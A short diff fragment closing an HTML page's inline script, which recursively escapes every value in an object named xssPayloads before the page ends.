+        if(Array.isArray(v)) return v.map(walk);
+        if(v && typeof v === 'object'){
+          for(const k in v) v[k] = walk(v[k]);
+          return v;
+        }
+        return hardEscape(v);
+      }
+      if(typeof xssPayloads === 'object' && xssPayloads) walk(xssPayloads);
+    })();
+
+  </script>
+
+
+
+
+</body></html>
